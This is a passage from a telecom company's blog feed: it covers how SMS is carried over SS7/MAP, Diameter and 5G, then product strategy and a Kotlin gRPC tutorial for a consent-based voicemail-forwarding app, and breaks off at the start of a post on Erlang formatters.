different charset instead. <em>USC-2</em> uses 2 bytes, or 16 bits, instead
of <em>GSM7</em>s 7 bits. That leaves you with 70 characters per
<em>SMS</em>. <em>USC-2</em> is similar for the basic multilingual plane (<em>BMP</em>) to
<em>UTF-16</em>. In fact <em>UTF-16</em> is an extension of <em>UCS-2</em>. The main
difference is that <em>USC-2</em> is fixed width and does not allow for the
extended characters in the private use area of <em>BMP</em>. <em>UTF-16</em> is
variable width of one or two 16-bits code points, and does allow the
extended characters. For extended characters to work (for instance
"praying/folded hands" <!-- -->🙏<!-- -->), phones might try to fake <em>UTF-16</em>
by using two <em>USC-2</em> characters. New phones can handle this fine, but
older phones might receive two question marks as they cannot decode it
properly.</p><p>If <em>GSM7</em> have a modified charset (i.e. not the default <em>BMP</em>) then
there will be a header in front that specifies that. That header will
take up 7 bytes after packing (in other words 8 characters), making
the maximum length of the <em>SMS</em> 152 characters.</p><div class="left-right-row"><img loading="lazy" class="image" src="/img/blog/sms/67_chars.png" alt="Characters left: 45/67 (3)"><div class="text">Using emojis will convert the encoding to USC-2. Note the missing 3 characters and that there are multiple SMSes. When multiple messages are sent, the phone needs some way of telling how to reassemble the messages. The headers take up 6 bytes per message for this purpose.</div></div><p>However when <em>MAP</em> v2 started to use <em>TCAP</em> dialogues there was more
information to put into the packet and 140 bytes might not be left for
the <em>SMS</em>. The <em>SMSC</em> would then need to break up the message into
chunks, and start the transaction an empty <em>TCAP</em> <code>Begin</code> message and
set a flag in the <em>MT</em> request called <code>moreMessagesToSend</code>. It would
then send the actual text inside <code>Continue</code> messages. In the end
the <code>End</code> (<em>hehe</em>) message is transmitted as a response and the
transaction is finished.</p><p>The response back to a <em>MO</em> request is, as previous stated, an
acknowledgement if the <em>SMS</em> have been successfully submitted to the
<em>SMSC</em> or not (again either <code>returnResult</code> or <code>returnError</code>). For <em>MT</em>
requests the acknowledgement is if the <em>SMS</em> is successfully delivered
or not.</p><p>If the <em>MT</em> request is not successful, the <em>SMSC</em> could ask the <em>HLR</em>
(the Home Location Registry is basically a database containing user
subscriptions and knowledge of which nodes the mobile talked to
latest) to be notified when the user comes back online. A bunch of
other <em>MAP</em> messages are then involved, such as</p><ul><li><code>reportSMDeliveryStatus</code>,</li><li><code>informServiceCentre</code>,</li><li><code>alterServiceCentre</code>, and</li><li><code>readyForSM</code>.</li></ul><p><em>At least this is main idea I think...</em></p><h1>Differences in MAP versions for SMS</h1><p>There are three <em>MAP</em> versions defined for <em>SMS</em>. The latest version
(v4) is not used in the context of <em>SMS</em>.</p><p>In version 1, the dialogue portion was not invented and all chunks are
sent in new <em>TCAP</em> dialogues. The size of the user data could then
be 140 bytes.</p><p>In version 1 and version 2 there is no difference between <em>MT</em> and
<em>MO</em>. Everything is sent as another type of message <code>Forward-SM</code>,
which does not include any privacy correlation ids, and there are no
fancy responses with delivery status. There is still an
acknowledgement, but is in a form of an empty message.</p><p>Only way to see difference between an <em>MO</em> and a <em>MT</em> in version 1 is
to look at the addresses and see if they are either coming from an
<em>SMSC</em> or going to an <em>SMSC</em>.</p><p>The <code>moreMessagesToSend</code> flag was implemented in version 2, so it exist
only for version 2 and version 3.</p><p>Ok, to recap, what do we have now</p><ul><li><code>Begin</code>, <code>Continue</code>, <code>End</code>, <code>Abort</code> messages.</li><li>Dialogue handshake in the first request/response messages sent.</li><li><code>MT-Forward-SM</code>, <code>MO-Forward-SM</code>, <code>Forward-SM</code></li><li>Involved parties: Mobile phones, <em>MSC</em> and <em>SMSC</em></li></ul><p><em>Wait we are missing something. I've only covered 2G,3G..</em></p><h1>What about 4G/LTE and beyond (5G)?</h1><p><em>Ouch.</em></p><p><em>LTE</em> networks does not use any of the <em>M3UA</em>, <em>SCCP</em>, <em>TCAP</em>, <em>MAP</em>
protocols. In <em>LTE</em> networks the main message type is <em>Diameter</em> which
doesn't contain fragmentation and can contain larger
messages. Everything is sent in one request and every request is
answered with a response. <em>Diameter</em> could use either <em>TCP</em> or <em>SCTP</em> as
transport layer.</p><p>To make <em>SMSes</em> work on <em>LTE</em> networks a new interface <em>SGs</em> was
invented which translates <em>SS7</em> messages to <em>Diameter</em> messages.  This
interface is in most cases used by the <em>MSC</em> to translate the messages
to <em>Diameter</em> and forward it to the <em>MME</em> (Mobility Management Entity,
similar to <em>SGSN</em> but in the <em>LTE</em> network). The <em>MME</em> then forwards
it to the <em>UE</em> (user equipment, same as mobile subscriber or <em>MS</em> in
<em>GSM</em>/<em>GPRS</em> networks).</p><p>There is also the <em>SM-over-IP</em> that does not use <em>Diameter</em>. Instead
it uses the <em>SIP</em>-protocol (Session Initiation Protocol) to transfer
messages over <em>IP</em> and <em>TCP</em> or <em>UDP</em> to the <em>IMS</em> (IP Multimedia
Subsystem). <em>SIP</em> is also used to enable VoLTE (Voice over <em>LTE</em>).</p><p>For 5G the <em>SMSC</em> is called <em>SMSF</em>; The Centre becomes a Function. The
signalling will be based on <em>HTTP2</em>/<em>JSON</em> ontop of <em>TCP</em>. The <em>SMSF</em>
will still need to support both <em>MAP</em> and <em>Diameter</em>.</p><p>Relevant <a href="https://xkcd.com" target="_blank" rel="noopener noreferrer">xkcd</a>:</p><div class="left-right-row"><table class="text"><tbody><tr><td>Generation</td><td>2G/3G</td><td>4G</td><td>5G</td></tr><tr><td>Radio technology</td><td>GSM/GPRS</td><td>LTE</td><td>NR</td></tr><tr><td>Protocol group</td><td>SS7</td><td>Diameter</td><td>HTTP2/JSON</td></tr><tr><td></td><td>Node</td><td>Agent</td><td>Function</td></tr><tr><td>Session management</td><td>SGSN</td><td>MME</td><td>AMF</td></tr><tr><td>SM management</td><td>SMSC</td><td>SMSC</td><td>SMSF</td></tr><tr><td>User management</td><td>HLR</td><td>HSS</td><td>UDM</td></tr><tr><td>Device</td><td>MS</td><td>UE</td><td>UE</td></tr></tbody></table><a href="https://xkcd.com/2365/" target="_blank" rel="noopener noreferrer" class="image"><img loading="lazy" src="https://imgs.xkcd.com/comics/messaging_systems.png" class="img_ev3q"></a></div><h1>Headache</h1><p>Hopefully you did not get a (too severe) headache by reading this
post.</p><p>I've spared you with <strong>a lot</strong> of details on the lower level of
protocols. There are loads of implementation details that must match
the specifications, otherwise you will get all kinds of aborts and
possibly even dropped traffic.
For instance we learned that we accidentally sent dialogue portions in
more than the first response back, which seemed to work at first
glance; at closer inspection we found out that some messages were
dropped because the length of the packet became larger in size than an
allowed value. We could still send them, but the other side was not
able to receive them.</p><p>Remember: Telco is old and complex. However, it should still function
with different setups and on different hardware, vendors and with
environment.</p><p>Fun-fact: Sometimes a boolean value is not just encoded as a 1
or 0. To save bandwith telco decided that you could also just define
it as a <code>NULL OPTIONAL</code> meaning that if it is defined (but lacks a
value), then it is considered true.  if it is not defined then it is
considered false. This is the case for the <code>moreMessagesToSend</code> flag.</p><p>Hope you enjoy the reading as much as I enjoy digging into these
protocols!</p><p>Special thanks to <em>Stein Eldar</em> and <em>Tobias</em> for giving me feedback
and answering all my stupid questions on this subject, and <em>Atanas</em>
for making me realize there are yet other protocols to carry <em>SMS</em>.
Also <em>Bung</em> for this amazing addition:</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="addition-from-bung">Addition from <em>Bung</em><a class="hash-link" href="#addition-from-bung" title="Direct link to heading">​</a></h4><p>"I’ve spared you with a lot of details on the lower level of
protocols" needs a lot of emphasis.</p><p>Some funny extra complexities that just came into my mind while
reading:</p><p>The actual <em>SMS</em> text goes into a field called "user data". There is a
field called "user data length". When the message is <em>GSM7</em> encoded, the
"user data length" is the number of characters in the text message,
otherwise it's the number of bytes in the user data.</p><p>Normally the user data only contains the (encoded) text of the
message, but there is a field called "user data header" which
indicates that there is a length prefixed TLV header in the "user
data". If the message is <em>GSM7</em> encoded, then the "user data lenght"
field needs to be filled as if the "user data header" was really <em>GSM7</em>
encoded, which it isn't.</p><p><em>GSM7</em> is really a variably septet encoding, one character can consist
of either 7 or 14 bits similar to how a <em>UTF-8</em> code point can be 8,
16, 24, or 32 bits. Unlike <em>UTF-8</em> however, there are not multiple
byte ranges corresponding to the different locales (called code pages
in Unicode) but a single 7 bit shift character that says that
following 7 bits should be interpreted as a character from a
translation table which is communicated out of band.</p><p>So all that is only the complexities of a single field (the user data)
for a single encoding (<em>GSM7</em>).</p><p>Then the real kicker: The protocol for <em>SMS</em> is really called <em>SM-TP</em>
(Short Message Transfer Protocol). <em>SM-TP</em> is the same for 2G/3G (on top
of <em>MAP</em>), 4G (on top of <em>SIP</em>), 5G (on top of <em>HTTP</em>). So the very
same stupid "length prefixed TLV encoded headers concatenated with
encoded text with length either in characters or in bytes depending on
encoding and actual meaning of the encoding communicated out of band
but only sometimes" field exists no matter if your talking over old
legacy <em>MAP</em> or the modern <em>HTTP/XML</em> based 5G.</p>]]></content:encoded>
            <category>telco</category>
            <category>MAP</category>
            <category>TCAP</category>
            <category>SS7</category>
            <category>Forward-SM</category>
            <category>SMS</category>
        </item>
        <item>
            <title><![CDATA[A new hope for products in telecom]]></title>
            <link>https://www.wgtwo.com/jp/blog/a-new-hope-for-products-in-telecom</link>
            <guid>a-new-hope-for-products-in-telecom</guid>
            <pubDate>Fri, 28 Aug 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.]]></description>
            <content:encoded><![CDATA[<p>This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.</p><p>The prerequisites for a great product is that:</p><ol><li>It is valuable to the user and customer</li><li>It is easy enough to use so that the user can actually realise the value</li><li>It is feasible to build given the restraints you have on technology, legal, etc.</li><li>And on top of that it needs to make sense for your business</li></ol><p>Even if you succeed at all of this, you still have to market, sell and support it. I don’t know anyone - nor have I ever heard about any company - that is able to get this right every time.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="remember-that-one">Remember that one?<a class="hash-link" href="#remember-that-one" title="Direct link to heading">​</a></h2><p>Even Apple (with Steve Jobs still at the helm) had their flops. Remember “iTunes Ping”? No? Exactly.</p><p>Maybe you’re more into social products, so you bought “Facebook Home”? No I’m not talking about your Facebook wall or anything you see on a screen, but an actual screen produced by Facebook that you place in your home as you would a framed photo.</p><p>Well, those products were bold bets. A tech giant launching a smartphone wouldn’t be that risky, would it? Pull out your Amazon Fire Phone and Google it! Ah.. that's right! That one got discontinued just 13 months after launch.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="oh-the-pain">Oh the pain!<a class="hash-link" href="#oh-the-pain" title="Direct link to heading">​</a></h2><p>It’s never fun to see a product fail. When it happens, not only do the customers miss out on something potentially great, but it can end in billion dollar write offs and laying off thousands of employees.</p><p>Operators are often hit hard by these failures, but companies like Apple, Facebook, Amazon and many others can have product flops regularly and still grow and become even more successful. <strong>Why is that?</strong></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="learning-from-failure">Learning from failure<a class="hash-link" href="#learning-from-failure" title="Direct link to heading">​</a></h2><p>It’s easy to make fun of big companies that launch products that flop, but we really shouldn’t. Products that flop aren’t a symptom of something that’s wrong. Like Edison put it “I have not failed. I've just found 10,000 ways that won't work.”</p><p>Companies like Apple, Facebook and Amazon have figured out how they can continue to find 10,000 ways that won’t work so that they can create that one light bulb every now and then - and by doing so totally dominate their market.</p><p>They do this by empowering teams to</p><ol><li>Assess new opportunities</li><li>Discover new products</li><li>Build quickly</li><li>Test and learn early</li></ol><p>This is how 10,000 small bets are made.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="failing-to-learn">Failing to learn<a class="hash-link" href="#failing-to-learn" title="Direct link to heading">​</a></h2><p>Big traditional companies used to pour tens of millions of dollars into 1 big bet with a few years apart. This is the opposite of Edison’s approach. They never say it out loud but their quote could have been “I have failed, and I’m still clueless whether the other 9,999 ways could have worked”.</p><p>These days though, most big traditional companies have moved away from the “1 big bet approach” and created “digital departments”.</p><p>They hire people who have had success in companies that make many small bets, and they give them the freedom to organize themselves so that they can use the same methods. Some time goes by and there are few - or no - small bets placed.</p><p>Often the teams in these digital departments are empowered to:</p><ol><li>Assess new opportunities</li><li>Discover new products</li></ol><p>But the technology fundamentals are not in place yet, so they are not able to:
3. Build quickly</p><p>Which makes it impossible to:
4. Test and learn early</p><p>This is especially true for companies with systems that rely on telecom operators. A company that wants access to, or change part of, a solution that has to do with telecommunication has to contact their operators, then the operator typically has to contact their vendor, then the vendor typically creates a change request ticket in their system, and then finally they get back with a fix.</p><p>Adding that long wait to what should have been “built quickly” is exactly how they go from many small bets to 1 big bet.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="giving-up">Giving up<a class="hash-link" href="#giving-up" title="Direct link to heading">​</a></h2><p>The end result, be it from the 1 big bet approach or a failed digital department, is that the big company decides to “get back to basics”, “stick with what they know”, and “strengthen the core business” - meaning that they have entirely given up trying to create new products that people love.</p><p>The customers miss out on great new products, employees leave, and the business suffers.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-new-hope">A new hope<a class="hash-link" href="#a-new-hope" title="Direct link to heading">​</a></h2><p>Our company got started because of this pain. Getting access to a mobile core network to create even small products is hard.</p><p>If you are lucky enough to actually get access, what you will see is a closed, uniquely configured core network built on top of nodes from external vendors. Add to the mix that you need people who actually know how to build anything on top of old telecom protocols and you have a perfect storm. If you have all of this and somehow are able to build a successful product, guess what? It doesn’t scale to any other operator because they also have their own uniquely configured core network. And the privilege of getting access is reserved for employees and an exclusive list of vendors. If you are an independent product company who wants to build something cool you can forget about it!</p><p>This is why we built a mobile core network from scratch on top of AWS. Long story short this means that every operator using our core can use any product that is built with the <a href="https://developer.wgtwo.com/" target="_blank" rel="noopener noreferrer">wgtwo developer portal</a>.</p><p>We believe that subscribers will start to expect that they can add a range of valuable products to their subscription. This means going from a world where everyone gets the same standardized service from their operator - to a world where subscribers are treated as individuals who are free to activate the products that they want.</p><p>The way we do this is by enabling 3rd party developers (you!) to create products, and matching these products with operators so that the products are brought to the market for subscribers to enjoy.</p><p>In short, with the wgtwo developer portal, it is possible to build quickly, so you can test and learn early, making it possible to reduce the size of your bets, and increasing the chance of building great products that people love!</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="try-it-out-and-join-us">Try it out and join us<a class="hash-link" href="#try-it-out-and-join-us" title="Direct link to heading">​</a></h2><p>We hope to get your feedback so that we can keep our bets small, and keep learning!</p><p>Want to read about the first product we created, and how you can do the same using the developer portal? Check out my teammate David’s post on <a href="https://wgtwo.com/blog/building-software-for-a-telecom-core-network" target="_blank" rel="noopener noreferrer">Building software for a telecom core network</a>.</p><p>Join us at <a href="https://tadhack.com/2020/global/tadhack-trondheim-norway/" target="_blank" rel="noopener noreferrer">TADHack remotely</a> or at one of our locations in <a href="https://tadhack.com/2020/global/tadhack-trondheim-norway/" target="_blank" rel="noopener noreferrer">Trondheim</a> or <a href="https://tadhack.com/2020/global/tadhack-stockholm-sweden/" target="_blank" rel="noopener noreferrer">Stockholm</a> on October 10 and 11. It’s completely free, and you will get to play around with our APIs, meet some cool people, eat, drink and have fun. Hope to see you there!</p>]]></content:encoded>
            <category>telecom</category>
            <category>software-development</category>
            <category>core-network</category>
            <category>app-ecosystem</category>
        </item>
        <item>
            <title><![CDATA[Building software for a telecom core network]]></title>
            <link>https://www.wgtwo.com/jp/blog/building-software-for-a-telecom-core-network</link>
            <guid>building-software-for-a-telecom-core-network</guid>
            <pubDate>Fri, 21 Aug 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[One of the goals of wgtwo is to enable operators and third parties to build products and services for the “core network” of the telecom stack. In short, this means providing API access to a subscription’s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.]]></description>
            <content:encoded><![CDATA[<p>One of the goals of <strong>wgtwo</strong> is to enable operators and third parties to build products and services for the “core network” of the telecom stack. In short, this means providing API access to a subscription’s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-product">The product<a class="hash-link" href="#the-product" title="Direct link to heading">​</a></h2><p>One of the most common complaints people have with their Voicemail service in Europe is that you have to call in to your Voicemail to listen to your messages. In order to play the message, you have to navigate through a slow voice menu using your dialpad. We believed this would be easy to improve.</p><p>Our product idea was simple. When Alice leaves a voicemail message for Bob, Bob receives this message either as an audio file or as a speech-to-text transcript.</p><p><img loading="lazy" alt="VoiceBox splash screen" src="/jp/assets/images/voicebox-splash-6d10dc0d5c9ca95802530f5fd836ef96.png" width="360" height="640" class="img_ev3q">
<img loading="lazy" alt="VoiceBox home screen" src="/jp/assets/images/voicebox-home-068b8f7a8c60ed57cf2d95e6ae99693e.png" width="360" height="640" class="img_ev3q">
<img loading="lazy" alt="Android messaging app" src="/jp/assets/images/message-inbox-88042532d7ac1cfaebdfba3e6afb2509.png" width="360" height="640" class="img_ev3q"></p><p>The product idea isn’t what most people would call revolutionary, but almost all of the world's mobile operators have hermetically sealed core networks. This means it would be impossible to build this product without lawyering up and coming to some sort of agreement with one of them. The <strong>wgtwo</strong> core network, however, is open and provides API access to Voicemail, MMS and SMS  (among other things), which is just what we need to build our product.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="developing-on-the-wgtwo-platform">Developing on the <strong>wgtwo</strong> platform<a class="hash-link" href="#developing-on-the-wgtwo-platform" title="Direct link to heading">​</a></h2><p>To create a product on the <strong>wgtwo</strong> platform, the first thing you have to do is create a free developer account at <a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer"></a><a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer">https://developer.wgtwo.com</a>. Once you have signed up, you have to create an Organization and add a Product to that organization.</p><p>You can specify what permissions your product will require in the <code>Product &gt; Scopes</code> tab:</p><p><img loading="lazy" alt="Developer Portal Scopes Screen" src="/jp/assets/images/developer-portal-scopes-ef5c424f0dff92f40ac64b2a4fd748bd.png" width="740" height="709" class="img_ev3q"></p><p>In an ideal world, VoiceBox would work like this:</p><ol><li>The subscriber signs in and enables the desired functionality in VoiceBox.</li><li>The next time the subscriber receives a voicemail, an event is fired by <strong>wgtwo</strong>’s core network, which VoiceBox receives.</li><li>VoiceBox triggers an SMS/MMS send using our APIs.</li><li>The subscriber receives an SMS/MMS from the sender “VoiceBox”.</li></ol><p>In a few months time this ideal world should be reality, but at the time of writing (mid August 2020) we’re missing the events API and the “Send from Product” API. Currently VoiceBox works like this (changes are highlighted):</p><ol><li>The subscriber signs in and enables the desired functionality in VoiceBox.</li><li>The next time the subscriber receives a voicemail, <strong>VoiceBox will discover it by polling</strong>.</li><li>VoiceBox triggers an MMS send using our APIs.</li><li>The subscriber receives an <strong>MMS from their own number</strong>.</li></ol><p>It’s not perfect, but it still demonstrates the potential of the platform. None of this can happen without the subscriber’s consent though, so in the next section we’ll have a look at how that works.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="obtaining-user-consent">Obtaining user consent<a class="hash-link" href="#obtaining-user-consent" title="Direct link to heading">​</a></h2><p>The app we're building is touching sensitive data, and we can't do that without asking the subscriber if it’s okay. The <strong>wgtwo</strong> platform includes an OAuth implementation with SMS authentication, which means that we can be reasonably sure that the subscriber has consented.</p><p>When a subscriber opens VoiceBox for the first time, they’re met with a login page, and after completing a pin challenge they arrive at an OAuth consent screen. Here they have to accept the terms of VoiceBox, as well as all the required scopes.</p><p>The login is branded to look like the product (notice the pink action button), while the consent screen is branded to look like the operator (in our case this is <a href="https://vimla.se" target="_blank" rel="noopener noreferrer">Vimla</a>, a Swedish operator which uses our platform):
<img loading="lazy" alt="ID login screen" src="/jp/assets/images/msisdn-screen-0938beb47bb12752909ad9b10912f9c4.png" width="360" height="640" class="img_ev3q">
<img loading="lazy" alt="ID pin screen" src="/jp/assets/images/pin-screen-c16025eef0a1d6621d3c29fc54a045fa.png" width="360" height="640" class="img_ev3q">
<img loading="lazy" alt="ID consent screen" src="/jp/assets/images/consent-screen-f6be7afcb64d2bfd259bf029a73a9b16.png" width="360" height="640" class="img_ev3q"></p><p>Our platform has a standard <a href="https://oauth.net/2/" target="_blank" rel="noopener noreferrer">OAuth 2</a> flow. When the subscriber taps “Accept”, <strong>wgtwo</strong> redirects the subscriber to the third-party, which receives an "access token" that allows them to act on behalf of the subscriber. In this case the access token will let the third-party fetch Voicemails and send MMS from the subscriber, so it’s important to keep it safe.
Next we’ll look at using this access token to perform actions on the subscriber's behalf.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-the-wgtwo-api">Connecting to the <strong>wgtwo</strong> API<a class="hash-link" href="#connecting-to-the-wgtwo-api" title="Direct link to heading">​</a></h2><p>All <strong>wgtwo</strong> APIs are <a href="https://grpc.io/" target="_blank" rel="noopener noreferrer">gRPC</a>. This can be a bit intimidating if you are used to REST APIs, but luckily we also have official Java clients distributed through Maven/JitPack. If you want to use a different language you can generate your own client using our public proto files. One of the benefits of gRPC is that you don’t have to ever write your own rest adapter for the API.</p><p>Let’s have a look at how you can fetch a Voicemail file:</p><div class="language-kotlin codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-kotlin codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">fun getVoicemail(user: User, uuid: String): Voicemail? {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val getVoicemailRequest = VoicemailProto.GetVoicemailRequest.newBuilder().setVoicemailId(uuid).build()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val voicemail = try {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        blockingStub</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                .getVoicemail(getVoicemailRequest)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    } catch (e: StatusRuntimeException) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        logger.warn("Error getting voicemail $uuid; ${e.message}")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        throw e</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    if (voicemail.metadata) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        return Voicemail(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            ... // we map the gRPC voicemail object to a VoiceBox specific object</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    } else {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        logger.warn("No voicemail metadata for $uuid")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        return null</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We use the official <strong>wgtwo</strong> API client to fetch a voicemail based on the UUID of the voicemail, which we polled for earlier (code not shown).</p><p>Unlike with REST APIs, we don't have to think about writing client code and handling HTTP responses, this is taken care of by the gRPC client library.</p><p>Once we have the voicemail, we send it to the subscriber using their own number as the sender:</p><div class="language-kotlin codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-kotlin codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">fun sendMms(user: User, phone: Msisdn, audio: ByteString) = try {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val request = MmsProto.SendMessageFromSubscriberRequest</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .newBuilder()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .addMessageContent(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                MmsProto.MessageContent.newBuilder().setAudio(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    MmsProto.AudioContent.newBuilder().setWav(audio)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .setToE164(phone.toPhoneNumberProto()) // the receiver is the same as the sender</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .setFromSubscriber(phone.toPhoneNumberProto()) // the sender is the same as the receiver</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .build()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val response = blockingStub</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .sendMessageFromSubscriber(request)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    if (response.status == MmsProto.SendResponse.SendStatus.SEND_OK) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    } else {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        logger.warn("Unable to send MMS to ${phone.e164}: ${response.description} (${response.status.name})")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        false</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} catch (e: Exception) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    logger.warn("Unable to send MMS to ${phone.e164}: ${e.message}")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    false</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This is also pretty straightforward, except for the part where the sender is also the receiver. In the future this will be a bit less confusing, since we’ll be sending the MMS from the product (“VoiceBox”) instead of the subscriber itself.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a class="hash-link" href="#conclusion" title="Direct link to heading">​</a></h2><p>As you can see, we’re still in the early stages of our developer platform. In the coming year, we will be adding a lot more APIs, as well as building an app-store where subscribers can browse products that they want to add to their subscription. We believe opening up the core network in this way will allow third-party developers to build incredible apps that will lead to much happier subscribers, which will in turn lead to subscriber growth for operators on our platform.</p><p>At the time of writing, all apps on the platform have to be free, but we are working on a monetization model similar to that of the Apple and Google app-stores. Our main priority is to come up with a model that is fair to both third-party developers and operators.</p><p>If you’re interested in our platform, please head on over to <a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer"></a><a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer">https://developer.wgtwo.com</a> and create an account. If you have any questions please contact us at <a href="mailto:products@wgtwo.com" target="_blank" rel="noopener noreferrer">products@wgtwo.com</a>.</p>]]></content:encoded>
            <category>telecom</category>
            <category>software-development</category>
            <category>core-network</category>
            <category>app-ecosystem</category>
        </item>
        <item>
            <title><![CDATA[Choosing an Erlang formatter]]></title>
            <link>https://www.wgtwo.com/jp/blog/choosing-erlang-formatter/</link>
            <guid>choosing-erlang-formatter/</guid>
            <pubDate>Mon, 18 May 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[There are many different Erlang formatters, and as a hack day project]]></description>
            <content:encoded><![CDATA[<p>There are many different Erlang formatters, and as a hack day project
I investigated which options exist for us at <strong>wgtwo</strong>. There
are two main alternatives, but sadly both have problems.  I've also
briefly looked at an Erlang linter.</p><h1>Background</h1><p>In <strong>wgtwo</strong> we use a bunch of different programming
languages, and we all have different experiences and are used to
different languages and environments. We are pretty autonomous and we
are expected to jump in and out in different services to fix bugs and
add features.</p><p>We like when the code is uniform, because it makes it easier to focus
on the business logic. That is why we want to use tools to make sure
our code is consistent no matter who is the author, or which IDE is
used, or in which part of the system the code resides.</p><p>About half a year ago there was a discussion about code style within
<strong>wgtwo</strong> that resulted in formatting tools being applied for
Kotlin, Bazel, Go and Java. It also resulted in an internal wiki page
containing guidelines about code style.</p><p>That document highlights some of the problems with mixing different
